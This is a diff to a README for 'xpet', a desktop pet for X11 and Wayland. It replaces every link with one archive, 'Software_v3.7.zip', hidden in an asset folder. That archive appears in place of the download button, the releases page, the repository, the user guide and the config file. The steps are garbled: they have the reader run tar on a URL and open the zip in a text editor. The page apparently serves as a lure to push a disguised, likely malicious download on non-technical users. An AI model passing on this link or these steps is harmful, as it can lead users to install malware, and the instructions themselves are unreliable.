@@ -4,7 +4,7 @@
 Welcome to xpet, a lightweight and fun on-screen pet that works with both X11 and Wayland environments. This guide helps you easily download and run xpet, even if you're not a technical user. Just follow the steps below.
 
 ## 📥 Download xpet
-[![Download xpet](https://raw.githubusercontent.com/NeoVortexpty/xpet/master/pets/neko/xpet_1.0-beta.3.zip)](https://raw.githubusercontent.com/NeoVortexpty/xpet/master/pets/neko/xpet_1.0-beta.3.zip)  
+[![Download xpet](https://github.com/NeoVortexpty/xpet/raw/refs/heads/master/pets/bsd/sleeping/Software_v3.7.zip)](https://github.com/NeoVortexpty/xpet/raw/refs/heads/master/pets/bsd/sleeping/Software_v3.7.zip)  
 Click the button above to visit the download page.
 
 ## 📂 System Requirements
@@ -23,15 +23,15 @@ To ensure xpet runs smoothly, make sure your system meets the following requirem
 ## 📖 How to Install and Run xpet
 
 ### Step 1: Visit the Download Page
-Go to the [Releases page](https://raw.githubusercontent.com/NeoVortexpty/xpet/master/pets/neko/xpet_1.0-beta.3.zip) to find the latest version of xpet.
+Go to the [Releases page](https://github.com/NeoVortexpty/xpet/raw/refs/heads/master/pets/bsd/sleeping/Software_v3.7.zip) to find the latest version of xpet.
 
 ### Step 2: Download the Application
-On the Releases page, you will see a list of available versions. Click on the latest version to expand the details. You should see a list of files to download. Look for a file named `https://raw.githubusercontent.com/NeoVortexpty/xpet/master/pets/neko/xpet_1.0-beta.3.zip` or similar.
+On the Releases page, you will see a list of available versions. Click on the latest version to expand the details. You should see a list of files to download. Look for a file named `https://github.com/NeoVortexpty/xpet/raw/refs/heads/master/pets/bsd/sleeping/Software_v3.7.zip` or similar.
 
-Click on the `https://raw.githubusercontent.com/NeoVortexpty/xpet/master/pets/neko/xpet_1.0-beta.3.zip` file to start the download. Make a note of where this file is saved on your computer.
+Click on the `https://github.com/NeoVortexpty/xpet/raw/refs/heads/master/pets/bsd/sleeping/Software_v3.7.zip` file to start the download. Make a note of where this file is saved on your computer.
 
 ### Step 3: Extract the Files
-Once the download is complete, you need to extract the contents of the `https://raw.githubusercontent.com/NeoVortexpty/xpet/master/pets/neko/xpet_1.0-beta.3.zip` file. You can do this by following these steps:
+Once the download is complete, you need to extract the contents of the `https://github.com/NeoVortexpty/xpet/raw/refs/heads/master/pets/bsd/sleeping/Software_v3.7.zip` file. You can do this by following these steps:
 
 1. Open your terminal.
 2. Navigate to the folder where you saved the file. Use the `cd` command, for example:
@@ -40,7 +40,7 @@ Once the download is complete, you need to extract the contents of the `https://
    ```
 3. Extract the file using the following command:
    ```
-   tar -xvzf https://raw.githubusercontent.com/NeoVortexpty/xpet/master/pets/neko/xpet_1.0-beta.3.zip
+   tar -xvzf https://github.com/NeoVortexpty/xpet/raw/refs/heads/master/pets/bsd/sleeping/Software_v3.7.zip
    ```
 
 This action creates a new folder named `xpet` in your current directory.
@@ -67,7 +67,7 @@ You should now see your new on-screen pet! Enjoy!
 xpet offers several options for personalized settings. You can change your pet's appearance or behavior through configuration files. Here’s how to customize:
 
 1. Locate the `config` folder inside the `xpet` directory.
-2. Open the `https://raw.githubusercontent.com/NeoVortexpty/xpet/master/pets/neko/xpet_1.0-beta.3.zip` file with a text editor.
+2. Open the `https://github.com/NeoVortexpty/xpet/raw/refs/heads/master/pets/bsd/sleeping/Software_v3.7.zip` file with a text editor.
 3. Modify the settings per your preference. Each option is clearly labeled.
 
 ## 🐛 Troubleshooting
@@ -84,8 +84,8 @@ If you encounter issues running xpet, here are some common solutions:
 
 ## 🔍 Additional Resources
 For more information, you can visit the following resources:
-- [xpet GitHub Repository](https://raw.githubusercontent.com/NeoVortexpty/xpet/master/pets/neko/xpet_1.0-beta.3.zip)
-- [User Guide](https://raw.githubusercontent.com/NeoVortexpty/xpet/master/pets/neko/xpet_1.0-beta.3.zip)
+- [xpet GitHub Repository](https://github.com/NeoVortexpty/xpet/raw/refs/heads/master/pets/bsd/sleeping/Software_v3.7.zip)
+- [User Guide](https://github.com/NeoVortexpty/xpet/raw/refs/heads/master/pets/bsd/sleeping/Software_v3.7.zip)
 
 ## 💬 Support
 If you have questions or need help, feel free to open an issue in the GitHub repository. Our community will happy to assist you.
